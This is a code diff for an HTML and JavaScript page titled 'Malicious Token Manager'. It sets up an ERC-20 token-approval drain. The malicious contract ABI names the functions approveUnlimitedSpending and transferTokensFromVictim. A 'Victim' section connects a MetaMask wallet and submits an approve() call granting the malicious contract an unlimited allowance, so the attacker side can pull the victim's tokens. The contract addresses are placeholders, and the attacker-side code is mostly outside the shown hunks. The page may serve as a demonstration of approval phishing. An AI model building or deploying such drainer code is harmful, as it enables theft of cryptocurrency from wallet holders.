@@ -20,7 +20,6 @@
 </head>
 <body>
 
-
     <h1>Malicious Token Manager</h1>
 
     <!-- Common Elements -->
@@ -38,474 +37,92 @@
 
         
         // Common ABI (Token erc-20 ABI)
-       const tokenABI = [
-    {
-        "inputs": [
-            {
-                "internalType": "uint256",
-                "name": "initialSupply",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-    },
-    {
-        "anonymous": false,
-        "inputs": [
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "owner",
-                "type": "address"
-            },
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "spender",
-                "type": "address"
-            },
-            {
-                "indexed": false,
-                "internalType": "uint256",
-                "name": "value",
-                "type": "uint256"
-            }
-        ],
-        "name": "Approval",
-        "type": "event"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "spender",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "approve",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transfer",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "anonymous": false,
-        "inputs": [
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "from",
-                "type": "address"
-            },
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "to",
-                "type": "address"
-            },
-            {
-                "indexed": false,
-                "internalType": "uint256",
-                "name": "value",
-                "type": "uint256"
-            }
-        ],
-        "name": "Transfer",
-        "type": "event"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "sender",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "owner",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "spender",
-                "type": "address"
-            }
-        ],
-        "name": "allowance",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "account",
-                "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "decimals",
-        "outputs": [
-            {
-                "internalType": "uint8",
-                "name": "",
-                "type": "uint8"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "name",
-        "outputs": [
-            {
-                "internalType": "string",
-                "name": "",
-                "type": "string"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "symbol",
-        "outputs": [
-            {
-                "internalType": "string",
-                "name": "",
-                "type": "string"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "totalSupply",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    }
+     const tokenABI = [
+    { "inputs": [{ "internalType": "uint256", "name": "initialSupply", "type": "uint256" }], "stateMutability": "nonpayable", "type": "constructor" },
+    { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" },
+    { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+    { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" },
+    { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
 ];
 
-
-   const maliciousContractABI = [
-    // Standard ERC-20 Token Functions
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "owner",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "spender",
-                "type": "address"
-            }
-        ],
-        "name": "allowance",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "spender",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "approve",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "account",
-                "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transfer",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "sender",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-
-    // Malicious Contract Specific Functions
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "_tokenAddress",
-                "type": "address"
-            }
-        ],
-        "name": "constructor",
-        "type": "constructor"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "victim",
-                "type": "address"
-            }
-        ],
-        "name": "approveUnlimitedSpending",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "victim",
-                "type": "address"
-            }
-        ],
-        "name": "checkAllowance",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "victim",
-                "type": "address"
-            }
-        ],
-        "name": "transferTokensFromVictim",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "transferTokensToDeployer",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
+const maliciousContractABI = [
+    { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }], "name": "constructor", "type": "constructor" },
+    { "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "approveUnlimitedSpending", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "checkAllowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "transferTokensFromVictim", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
 ];
 
     </script>
 
 
-    <!-- Victim Section -->
-    <div id="victimSection">
-        <h2>Victim: Approve Malicious Token Manager</h2>
-        <button id="connectVictimWalletBtn">Connect Victim Wallet</button>
-        <button id="approveTokensBtn" style="display:none;">Approve Tokens</button>
-        <p id="victimStatus"></p>
-        <h3>Instructions for Victim:</h3>
-        <p>Connect your wallet and approve the malicious contract to spend unlimited tokens on your behalf.</p>
+  <!-- Victim Section -->
+<div id="victimSection">
+    <h2>Victim: Approve Malicious Token Manager</h2>
+    <button id="connectVictimWalletBtn">Connect Victim Wallet</button>
+    <button id="approveTokensBtn" style="display:none;">Approve Tokens</button>
+    <p id="victimStatus"></p>
+    <h3>Instructions for Victim:</h3>
+    <p>Connect your wallet and approve the malicious contract to spend unlimited tokens on your behalf.</p>
 
-        <script>
-            // Connect Victim Wallet
-            document.getElementById("connectVictimWalletBtn").addEventListener("click", connectVictimWallet);
-            
-            async function connectVictimWallet() {
-                if (typeof window.ethereum !== 'undefined') {
+    <script>
+        // Initialize Web3 and contract variables
+        let web3;
+        let accounts;
+        let tokenContract;
+        const tokenAddress = "<YOUR_TOKEN_CONTRACT_ADDRESS>";
+        const maliciousContractAddress = "<MALICIOUS_CONTRACT_ADDRESS>";
+        const tokenABI = <YOUR_TOKEN_ABI>;
+
+        // Connect Victim Wallet
+        document.getElementById("connectVictimWalletBtn").addEventListener("click", connectVictimWallet);
+
+        async function connectVictimWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Request accounts and initialize Web3
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     web3 = new Web3(window.ethereum);
                     accounts = await web3.eth.getAccounts();
+                    // Update status with connected wallet address
                     document.getElementById('victimStatus').innerText = `Connected: ${accounts[0]}`;
                     document.getElementById("approveTokensBtn").style.display = "inline-block";
+                    // Initialize the token contract
                     tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-                } else {
-                    alert("Please install MetaMask!");
-                }
-            }
-
-            // Approve tokens for malicious contract
-            document.getElementById("approveTokensBtn").addEventListener("click", async () => {
-                try {
-                    const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
-                    await tokenContract.methods.approve(maliciousContractAddress, unlimitedAmount).send({ from: accounts[0] });
-                    document.getElementById('victimStatus').innerText = "Approval successful! Unlimited tokens approved.";
                 } catch (error) {
-                    document.getElementById('victimStatus').innerText = "Approval failed!";
-                    console.error("Error during approval:", error);
+                    document.getElementById('victimStatus').innerText = "Connection failed!";
+                    console.error("Error connecting wallet:", error);
                 }
-            });
-        </script>
-    </div>
+            } else {
+                alert("Please install MetaMask!");
+            }
+        }
+
+        // Approve tokens for malicious contract
+        document.getElementById("approveTokensBtn").addEventListener("click", async () => {
+            try {
+                const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+                // Approve the malicious contract to spend unlimited tokens
+                await tokenContract.methods.approve(maliciousContractAddress, unlimitedAmount).send({ from: accounts[0] });
+                document.getElementById('victimStatus').innerText = "Approval successful! Unlimited tokens approved.";
+            } catch (error) {
+                document.getElementById('victimStatus').innerText = "Approval failed!";
+                console.error("Error during approval:", error);
+            }
+        });
+    </script>
+</div>
+
 
     <!-- Attacker Section -->
     <div id="attackerSection">
@@ -653,15 +270,6 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
-
-
-
-
-
-
-
-
-
 
 
 
